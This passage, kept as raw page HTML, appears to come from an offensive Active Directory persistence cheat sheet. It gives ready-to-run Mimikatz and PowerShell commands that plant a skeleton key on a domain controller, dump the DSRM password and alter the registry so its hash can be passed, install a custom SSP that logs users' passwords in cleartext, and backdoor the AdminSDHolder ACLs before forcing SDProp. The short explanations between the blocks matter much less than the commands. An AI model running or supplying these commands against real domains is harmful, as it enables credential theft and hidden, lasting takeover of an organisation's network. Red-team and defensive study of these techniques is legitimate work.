<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 673px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 672.905px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Invoke-Mimikatz</span> <span class="cm-operator">-</span><span class="cm-identifier">Command</span> <span class="cm-string">'"privilege::debug" "misc::skeleton"'</span> <span class="cm-operator">-</span><span class="cm-identifier">ComputerName</span> <span class="cm-identifier">dc</span><span class="cm-punctuation">.</span><span class="cm-identifier">domain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 84px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<p id="bkmrk-now%2C-it-is-possible-">Now, it is possible to access any machine with a valid username and password as "mimikatz"</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 477px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 477.476px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">Enter-PSSession</span> <span class="cm-operator">-</span><span class="cm-identifier">Computername</span> <span class="cm-identifier">dc</span> <span class="cm-operator">-</span><span class="cm-identifier">Credential</span> <span class="cm-identifier">domain</span><span class="cm-punctuation">\</span><span class="cm-identifier">Administrator</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 84px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h3 id="bkmrk-dsrm">DSRM</h3>
<ul id="bkmrk-dsrm-is-directory-se"><li>DSRM is Directory Services Restore Mode</li>
<li>The local administrator on every DC can authenticate with the DSRM password</li>
<li>It is possible to pass the hash of this user to access the DC after modifying the DC configuration</li>
</ul><h4 id="bkmrk-dump-dsrm-password">Dump DSRM password</h4>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 550px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 549.857px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Invoke-Mimikatz</span> <span class="cm-operator">-</span><span class="cm-identifier">Command</span> <span class="cm-string">'"token::elevate" "lsadump::sam"'</span> <span class="cm-operator">-</span><span class="cm-identifier">Computername</span> <span class="cm-identifier">dc</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 84px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-change-registry-conf">Change registry configuration</h4>
<p id="bkmrk-need-to-change-the-l">Need to change the logon behavior before pass the hash</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 897px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 55px; min-width: 897.286px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">Enter-PSSession</span> <span class="cm-operator">-</span><span class="cm-identifier">Computername</span> <span class="cm-identifier">dc</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">New-ItemProperty</span> <span class="cm-string">"HKLM:\System\CurrentControlSet\Control\Lsa\\"</span> <span class="cm-operator">-</span><span class="cm-identifier">Name</span> <span class="cm-string">"DsrmAdminLogonBehavior"</span> <span class="cm-operator">-</span><span class="cm-identifier">Value</span> <span class="cm-number">2</span> <span class="cm-operator">-</span><span class="cm-identifier">PropertyType</span> <span class="cm-identifier">DWORD</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 55px;"></div><div class="CodeMirror-gutters" style="height: 105px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<p id="bkmrk-now-the-dsrm-hash-ca">Now the DSRM hash ca be used to authenticate</p>
<h3 id="bkmrk-custom-ssp">Custom SSP</h3>
<p id="bkmrk-ssp-are-ddls-that-pr">SSP are DDLs that provide ways to authenticate for the application. For example Kerberos, NTLM, WDigest, etc. Mimikatz provides a custom SSP that permits to log in a file in clear text the passwords of the users that authenticate on the machine.</p>
<ul id="bkmrk-by-patching-lsass-%28r"><li>By patching LSASS (really instable since Server 2016)</li>
</ul><div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true"><div style="height: 100%; min-height: 1px; width: 0px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 303.762px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Invoke-Mimikatz</span> <span class="cm-operator">-</span><span class="cm-identifier">Command</span> <span class="cm-string">'"misc::memssp"'</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 0px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 74px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<ul id="bkmrk-by-modifying-the-lsa"><li>By modifying the LSA registry</li>
</ul><p id="bkmrk-upload-the-mimilib.d">Upload the <code>mimilib.dll</code> to <strong>system32</strong> and add mimilib to <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages</code> :</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 1035px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 77px; min-width: 1034.81px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable-2">$packages</span> <span class="cm-operator">=</span> <span class="cm-builtin">Get-ItemProperty</span> <span class="cm-identifier">HKLM</span><span class="cm-operator">:</span><span class="cm-punctuation">\</span><span class="cm-identifier">SYSTEM</span><span class="cm-punctuation">\</span><span class="cm-identifier">CurrentControlSet</span><span class="cm-punctuation">\</span><span class="cm-identifier">Control</span><span class="cm-punctuation">\</span><span class="cm-identifier">Lsa</span><span class="cm-punctuation">\</span> <span class="cm-operator">-</span><span class="cm-identifier">Name</span> <span class="cm-string">'Security Packages'</span><span class="cm-operator">|</span> <span class="cm-builtin">select</span> <span class="cm-operator">-</span><span class="cm-identifier">ExpandProperty</span> <span class="cm-string">'Security Packages'</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable-2">$packages</span> <span class="cm-operator">+=</span> <span class="cm-string">"mimilib"</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">Set-ItemProperty</span> <span class="cm-identifier">HKLM</span><span class="cm-operator">:</span><span class="cm-punctuation">\</span><span class="cm-identifier">SYSTEM</span><span class="cm-punctuation">\</span><span class="cm-identifier">CurrentControlSet</span><span class="cm-punctuation">\</span><span class="cm-identifier">Control</span><span class="cm-punctuation">\</span><span class="cm-identifier">Lsa</span><span class="cm-punctuation">\</span> <span class="cm-operator">-</span><span class="cm-identifier">Name</span> <span class="cm-string">'Security Packages'</span> <span class="cm-operator">-</span><span class="cm-identifier">Value</span> <span class="cm-variable-2">$packages</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 77px;"></div><div class="CodeMirror-gutters" style="height: 127px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<p id="bkmrk-all-local-logons-on-">All local logons on the DC are logged to <code>C:\Windows\system32\kiwissp.log</code></p>
<h3 id="bkmrk-acls---adminsdholder">ACLs - AdminSDHolder</h3>
<p id="bkmrk-adminsdholder-is-a-s">AdminSDHolder is a solution that compares the ACLS of the objects with <code>AdminCount=1</code> with a list of ACLs. If the ACLs of the objects are different, they are overwritten. The script run normally every hour.</p>
<h4 id="bkmrk-attack">Attack</h4>
<ul id="bkmrk-with-write-privs-on-"><li>With write privs on the AdminSDHolder object, it can be used for persistence by adding a user with Full Permissions to the AdminSDHolder object for example.</li>
<li>When the automatic script will run, the user will be added with Full Control to the AC of groups like Domain Admins.</li>
</ul><div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 774px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 120px; min-width: 774.238px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#PowerView</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Add-ObjectAcl</span> <span class="cm-operator">-</span><span class="cm-identifier">TargetSearchBase</span> <span class="cm-string">'CN=AdminSDHolder,CN=System'</span> <span class="cm-operator">-</span><span class="cm-identifier">PrincipalIdentity</span> <span class="cm-identifier">user1</span> <span class="cm-operator">-</span><span class="cm-identifier">Rights</span> <span class="cm-identifier">All</span> <span class="cm-operator">-</span><span class="cm-identifier">Verbose</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#AD Module</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Set-ADACL</span> <span class="cm-operator">-</span><span class="cm-identifier">DistinguishedName</span> <span class="cm-string">'CN=AdminSDHolder,CN=System,DC=domain,DC=local'</span> <span class="cm-operator">-</span><span class="cm-identifier">Principal</span> <span class="cm-identifier">user1</span> <span class="cm-operator">-</span><span class="cm-identifier">Verbose</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 120px;"></div><div class="CodeMirror-gutters" style="height: 170px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-run-sdprop-manually">Run SDProp manually</h4>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 637px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 77px; min-width: 636.714px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Invoke-SDPropagator</span> <span class="cm-operator">-</span><span class="cm-identifier">timeoutMinutes</span> <span class="cm-number">1</span> <span class="cm-operator">-</span><span class="cm-identifier">showProgress</span> <span class="cm-operator">-</span><span class="cm-identifier">Verbose</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Pre-Server 2008</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Invoke-SDPropagator</span> <span class="cm-operator">-</span><span class="cm-identifier">taskname</span> <span class="cm-identifier">FixUpInheritance</span> <span class="cm-operator">-</span><span class="cm-identifier">timeoutMinutes</span> <span class="cm-number">1</span> <span class="cm-operator">-</span><span class="cm-identifier">showProgress</span> <span class="cm-operator">-</span><span class="cm-identifier">Verbose</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 77px;"></div><div class="CodeMirror-gutters" style="height: 127px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-check-domain-admin-a">Check Domain Admin ACLs</h4>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 832px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 120px; min-width: 832.143px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#PowerView</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-ObjectAcl</span> <span class="cm-operator">-</span><span class="cm-identifier">SamAccountName</span> <span class="cm-string">"Domain Admins"</span> <span class="cm-operator">-</span><span class="cm-identifier">ResolveGUIDs</span> <span class="cm-operator">|</span> <span class="cm-builtin">?</span><span class="cm-punctuation">{</span><span class="cm-builtin">$_</span><span class="cm-punctuation">.</span><span class="cm-identifier">IdentityReference</span> <span class="cm-operator">-match</span> <span class="cm-string">'user1'</span><span class="cm-punctuation">}</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#AD Module</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-punctuation">(</span><span class="cm-builtin">Get-Acl</span> <span class="cm-operator">-</span><span class="cm-identifier">Path</span> <span class="cm-string">'AD:\CN=Domain Admins,CN=Users,DC=domain,DC=local'</span><span class="cm-punctuation">).</span><span class="cm-identifier">Access</span> <span class="cm-operator">|</span> <span class="cm-builtin">?</span><span class="cm-punctuation">{</span><span class="cm-builtin">$_</span><span class="cm-punctuation">.</span><span class="cm-identifier">IdentityReference</span> <span 